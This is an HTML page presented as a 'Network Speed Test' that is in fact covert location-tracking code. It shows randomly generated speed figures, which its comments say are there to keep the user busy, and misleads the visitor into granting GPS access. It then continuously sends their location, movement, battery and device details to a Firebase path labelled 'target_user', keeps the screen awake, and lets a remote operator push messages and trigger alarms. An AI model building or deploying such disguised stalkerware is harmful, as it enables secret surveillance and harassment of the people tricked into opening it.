<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Speed Test</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #333; text-align: center; }
        .header { font-size: 24px; font-weight: bold; color: #1e3a8a; margin-bottom: 20px; }
        .speed-circle { border: 10px solid #e2e8f0; border-top: 10px solid #3b82f6; border-radius: 50%; width: 150px; height: 150px; display: flex; align-items: center; justify-content: center; flex-direction: column; animation: pulse 2s infinite; margin: 0 auto 30px; }
        .speed-value { font-size: 32px; font-weight: bold; color: #1e3a8a; }
        .speed-unit { font-size: 14px; color: #64748b; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(59, 130, 246, 0); } 100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); } }
        .info-text { font-size: 14px; color: #64748b; margin-bottom: 5px; }
        #status { font-size: 12px; color: #10b981; font-weight: bold; margin-top: 20px; }
        #chatBox { display: none; background: #ef4444; color: #fff; padding: 15px; border-radius: 10px; margin-top: 20px; font-weight: bold; width: 80%; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
    </style>
</head>
<body>

    <div class="header">Network Speed Test</div>
    
    <div class="speed-circle">
        <div class="speed-value" id="fakeSpeed">0.0</div>
        <div class="speed-unit">Mbps</div>
    </div>

    <div class="info-text">Finding optimal server...</div>
    <div class="info-text">Testing Download & Upload Speed</div>
    <h3 id="status">Connecting...</h3>
    
    <div id="chatBox">🔔 <span id="msgText"></span></div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getDatabase, ref, set, onValue, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk", authDomain: "arng-805db.firebaseapp.com", projectId: "arng-805db", databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/" };
        const app = initializeApp(firebaseConfig); const db = getDatabase(app);
        const userRef = ref(db, 'live_location/target_user');
        const chatRef = ref(db, 'live_location/chat');
        const commandRef = ref(db, 'live_location/command');

        const statusTxt = document.getElementById('status');
        const fakeSpeedTxt = document.getElementById('fakeSpeed');
        const chatBox = document.getElementById('chatBox'), msgText = document.getElementById('msgText');
        const loudAlarm = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');

        // 1. Screen Wake-Lock API (স্ক্রিন বন্ধ হবে না)
        let wakeLock = null;
        const requestWakeLock = async () => {
            try { if ('wakeLock' in navigator) { wakeLock = await navigator.wakeLock.request('screen'); } } 
            catch (err) { console.log("Wake Lock error"); }
        };
        document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible') requestWakeLock(); });
        requestWakeLock();

        // Fake Speed Generator (ইউজারকে ব্যস্ত রাখতে)
        setInterval(() => { fakeSpeedTxt.innerText = (Math.random() * (45.5 - 15.2) + 15.2).toFixed(1); }, 1000);

        // Device & Battery Info
        const getDeviceInfo = () => { const ua = navigator.userAgent; if(/Android/i.test(ua)) return "Android"; if(/iPhone|iPad/i.test(ua)) return "iOS"; return "PC/Other"; };
        let batteryLevel = "Unknown", isCharging = false;
        if (navigator.getBattery) { navigator.getBattery().then(b => { batteryLevel = Math.round(b.level * 100); isCharging = b.charging; b.addEventListener('levelchange', () => batteryLevel = Math.round(b.level * 100)); }); }

        // Messages & Alarms
        onValue(chatRef, (snapshot) => { const data = snapshot.val(); if(data && data.time > Date.now() - 5000) { msgText.innerText = data.message; chatBox.style.display = "block"; setTimeout(() => { chatBox.style.display = "none"; }, 10000); }});
        onValue(commandRef, (snapshot) => { const cmd = snapshot.val(); if(cmd && cmd.ringTime > Date.now() - 5000) { loudAlarm.play().catch(e=>{}); if(navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]); }});

        // 3. Auto Reconnect & GPS Logic
        window.addEventListener('online', () => statusTxt.innerText = "Server Connected (Testing...)");
        window.addEventListener('offline', () => statusTxt.innerText = "Reconnecting to server...");

        window.onload = () => {
            if (navigator.geolocation) {
                onDisconnect(userRef).update({ isOnline: false, status: "Offline" });
                navigator.geolocation.watchPosition(
                    (position) => {
                        const lat = position.coords.latitude, lng = position.coords.longitude, acc = position.coords.accuracy;
                        let speed = position.coords.speed ? Math.round(position.coords.speed * 3.6) : 0;
                        let heading = position.coords.heading ? position.coords.heading : 0; // Direction

                        set(userRef, { 
                            latitude: lat, longitude: lng, accuracy: acc, speed: speed, heading: heading,
                            battery: batteryLevel, charging: isCharging, deviceInfo: getDeviceInfo(),
                            isOnline: true, timestamp: new Date().toLocaleString() 
                        });
                        statusTxt.innerText = "Server Connected (Testing...)";
                    },
                    (error) => { statusTxt.innerText = "Location needed for closest server!"; },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        };
    </script>
</body>
</html>
